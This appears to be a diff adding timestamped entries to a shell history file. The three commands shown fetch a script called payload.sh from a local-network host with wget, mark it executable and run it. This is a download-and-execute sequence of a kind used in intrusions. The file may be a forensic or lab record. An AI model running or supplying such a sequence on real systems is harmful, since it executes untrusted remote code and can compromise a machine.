@@ -1,0 +1,6 @@
+#1710123300
+wget http://192.168.1.200/payload.sh
+#1710123360
+chmod +x payload.sh
+#1710123420
+./payload.sh
